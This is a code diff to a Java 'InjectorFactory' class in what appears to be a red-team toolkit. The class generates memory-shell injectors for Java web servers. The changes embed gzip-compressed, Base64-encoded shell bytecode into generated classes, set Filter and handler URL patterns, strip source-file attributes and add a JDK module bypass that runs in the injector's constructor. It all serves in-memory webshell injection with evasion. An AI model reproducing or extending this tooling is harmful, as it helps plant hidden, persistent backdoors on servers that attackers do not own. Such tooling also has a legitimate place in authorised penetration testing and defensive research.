@@ -10,7 +10,10 @@ import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
 import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
 import com.potato.potatotool.content.redTeam.memshell.util.ExpModifierUtil;
 import com.potato.potatotool.content.redTeam.memshell.util.InjectorUtil;
+import com.potato.potatotool.content.redTeam.memshell.util.JDKBypassUtil;
 import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
+import com.potato.potatotool.content.redTeam.memshell.util.UrlPatternUtil;
+import javassist.CtConstructor;
 
 /**
  * @author Potato
@@ -38,50 +41,67 @@ public class InjectorFactory {
     private byte[] transformInjectorBytes(String injectorClassName, MemoryObj memoryObj) throws Exception {
         // 将注入生成器类路径添加到类池中
         CLASS_POOL.insertClassPath(new ClassClassPath(this.getClass()));
-        // 从类池中获取指定的类
-        CtClass ctClass = CLASS_POOL.getCtClass(injectorClassName);
-        // 设置类文件版本为Java 5
-        ctClass.getClassFile().setVersionToJava5();
+        CtClass ctClass = null;
+        try {
+            // 从类池中获取指定的类
+            ctClass = CLASS_POOL.getCtClass(injectorClassName);
+            // 设置类文件版本为Java 5
+            ctClass.getClassFile().setVersionToJava5();
 
-        // 将shell字节数组压缩并进行Base64编码
-        String base64EncodedShell = StrUtils.base64Encode(GzipUtils.GzipGetCompressedData(memoryObj.getShellBytes())).replace(System.lineSeparator(), "");
-
-        if (base64EncodedShell != null) {
-            // 获取类中的getBase64String方法
-            CtMethod getBase64StringMethod = ctClass.getDeclaredMethod("getBase64String");
-            // 将base64字符串分割成指定长度的块
-            String[] base64Chunks = splitIntoChunks(base64EncodedShell.replace(System.lineSeparator(), ""), 40000);
-            StringBuilder base64StringBuilder = new StringBuilder();
-            for (int i = 0; i < base64Chunks.length; i++) {
-                if (i > 0) {
-                    base64StringBuilder.append("+");
-                }
-                base64StringBuilder.append("new String(\"").append(base64Chunks[i]).append("\")");
+            // 将shell字节数组压缩并进行Base64编码
+            byte[] shellBytes = memoryObj.getShellBytes();
+            if (shellBytes == null || shellBytes.length == 0) {
+                throw new IllegalStateException("Shell bytes are empty");
             }
-            // 设置getBase64String方法体，返回拼接后的base64字符串
-            getBase64StringMethod.setBody(String.format("{return %s;}", base64StringBuilder));
-        }
+            byte[] compressedShellBytes = GzipUtils.GzipGetCompressedData(shellBytes);
+            if (compressedShellBytes == null || compressedShellBytes.length == 0) {
+                throw new IllegalStateException("Compressed shell bytes are empty");
+            }
+            String base64EncodedShell = StrUtils.base64Encode(compressedShellBytes).replace(System.lineSeparator(), "");
 
-        // 针对shell类型为Filter或WFHandlerMethod，单独设置URL模式
-        if (memoryObj.getShellType().equalsIgnoreCase(MemoryShellConstants.SHELLTYPE_FILTER) || memoryObj.getShellType().equalsIgnoreCase(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD)) {
-            CtMethod getUrlPatternMethod = ctClass.getDeclaredMethod("getUrlPattern");
-            getUrlPatternMethod.setBody(String.format("{return \"%s\";}", memoryObj.getUrlPattern()));
-        }
+            if (base64EncodedShell != null) {
+                // 获取类中的getBase64String方法
+                CtMethod getBase64StringMethod = ctClass.getDeclaredMethod("getBase64String");
+                // 将base64字符串分割成指定长度的块
+                String[] base64Chunks = splitIntoChunks(base64EncodedShell.replace(System.lineSeparator(), ""), 40000);
+                StringBuilder base64StringBuilder = new StringBuilder();
+                for (int i = 0; i < base64Chunks.length; i++) {
+                    if (i > 0) {
+                        base64StringBuilder.append("+");
+                    }
+                    base64StringBuilder.append("new String(").append(JavassistUtil.toJavaStringLiteral(base64Chunks[i])).append(")");
+                }
+                // 设置getBase64String方法体，返回拼接后的base64字符串
+                getBase64StringMethod.setBody(String.format("{return %s;}", base64StringBuilder));
+            }
 
-        // 设置shell类名
-        if (memoryObj.getShellClassName() != null) {
-            CtMethod getClassNameMethod = ctClass.getDeclaredMethod("getClassName");
-            getClassNameMethod.setBody(String.format("{return \"%s\";}", memoryObj.getShellClassName()));
-        }
+            // 针对shell类型为Filter或WFHandlerMethod，单独设置URL模式
+            if (isUrlPatternShellType(memoryObj.getShellType())) {
+                CtMethod getUrlPatternMethod = ctClass.getDeclaredMethod("getUrlPattern");
+                getUrlPatternMethod.setBody(JavassistUtil.returnStringBody(UrlPatternUtil.requireValidUrlPattern(memoryObj.getUrlPattern())));
+            }
 
-        // 设置注入器类名
-        JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getInjectorClassName());
-        // 移除源文件属性
-        JavassistUtil.removeSourceFileAttribute(ctClass);
-        // 修改字节码用于利用
-        byte[] modifiedBytes = new ExpModifierUtil(memoryObj, ctClass).modifyClassForExploit();
-        ctClass.detach();
-        return modifiedBytes;
+            // 设置shell类名
+            if (memoryObj.getShellClassName() != null) {
+                CtMethod getClassNameMethod = ctClass.getDeclaredMethod("getClassName");
+                getClassNameMethod.setBody(JavassistUtil.returnStringBody(memoryObj.getShellClassName()));
+            }
+
+            if (memoryObj.isEnableBypassJDKModule()) {
+                addBypassJDKModule(ctClass);
+            }
+
+            // 设置注入器类名
+            JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getInjectorClassName());
+            // 移除源文件属性
+            JavassistUtil.removeSourceFileAttribute(ctClass);
+            // 修改字节码用于利用
+            return new ExpModifierUtil(memoryObj, ctClass).modifyClassForExploit();
+        } finally {
+            if (ctClass != null) {
+                ctClass.detach();
+            }
+        }
     }
 
     /**
@@ -103,6 +123,24 @@ public class InjectorFactory {
         }
 
         return chunks;
+    }
+
+    private static boolean isUrlPatternShellType(String shellType) {
+        return MemoryShellConstants.SHELLTYPE_FILTER.equalsIgnoreCase(shellType)
+                || MemoryShellConstants.SHELLTYPE_JAKARTA_FILTER.equalsIgnoreCase(shellType)
+                || MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD.equalsIgnoreCase(shellType);
+    }
+
+    private static void addBypassJDKModule(CtClass ctClass) throws Exception {
+        JavassistUtil.addOrUpdateMethod(ctClass, "bypassJDKModule",
+                "public void bypassJDKModule()" + JDKBypassUtil.bypassJDKModuleBody());
+        CtConstructor[] constructors = ctClass.getDeclaredConstructors();
+        if (constructors.length == 0) {
+            throw new IllegalStateException("Injector constructor is missing: " + ctClass.getName());
+        }
+        CtConstructor constructor = constructors[0];
+        constructor.setModifiers(javassist.Modifier.setPublic(constructor.getModifiers()));
+        constructor.insertBeforeBody("bypassJDKModule();");
     }
 
 }
